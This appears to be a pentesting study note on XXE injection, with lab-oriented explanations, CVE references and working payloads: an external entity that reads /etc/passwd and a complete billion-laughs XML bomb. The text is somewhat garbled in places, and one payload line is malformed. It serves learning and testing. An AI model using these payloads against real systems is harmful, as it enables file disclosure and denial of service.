# XXE

## Brief

{% hint style="info" %}
An XXE is a type of attack that is performed against an application in order to parse its XML input. In this attack XML input containing a reference to an external entity is processed by a weakly configured XML parser. _Like in Cross-Site Scripting (XSS) we try to inject scripts similarly in this we try to insert XML entities to gain crucial information_.

It is used for declaration of the structure of XML document, types of data value that it can contain, etc. DTD can be present inside the XML file or can be defined separately. It is declared at the beginning of XML using .

There are several types of DTDs and the one we are interested in is external DTDs. There are two types of external DTDs:

1. **SYSTEM**: System identifier enables us to specify the external file location that contains the DTD declaration

In this **XML external entity payload** is sent to the server and the server sends that data to an XML parser that parses the XML request and provides the desired **output** to the server. Then server **returns** that **output** to the **attacker**.
{% endhint %}

### Impacts

**OWASP TOP 10**

* _SSRF_
* _DoS_
* _RCE_
* _XSS_

The CVSS score of an **XXE** is **7.5** and its severity is **Medium** with :

* **CWE-611**: Improper Restriction of XML External Entity.
* **CVE-2019-12153**: Local File SSRF
* **CVE-2019-12154**: Remote File SSRF
* **CVE-2018-1000838**: Billion Laugh Attack
* **CVE-2019-0340**: XXE via File Upload

## XXE to SSRF

### Payloads

{% embed url="https://github.com/payloadbox/xxe-injection-payload-list" %}

### Local File Inclusion

With _bWAPP_

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
<!ENTITY ignite SYSTEM "file:///etc/passwd">
]>...<CODE>
```

### XXE Billion Laugh Attack-DOS

{% hint style="info" %}
These are aimed at XML parsers in which both, well-formed and valid, XML data crashes the system resources when being parsed. This attack is also known as **XML bomb** or XML **DoS** or exponential entity expansion attack.
{% endhint %}

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

### XXE File Upload

XXE can be performed using the file upload method.

{% embed url="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" %}
Lab XXE File Upload
{% endembed %}

## XXE to RCE

### POC with XXELAB

{% embed url="https://github.com/jbarone/xxelab" %}

```bash
git clone https://github.com/jbarone/xxelab.git
cd xxelab
vagrant up
```

![XXE to RCE](<../../.gitbook/assets/image (138).png>)
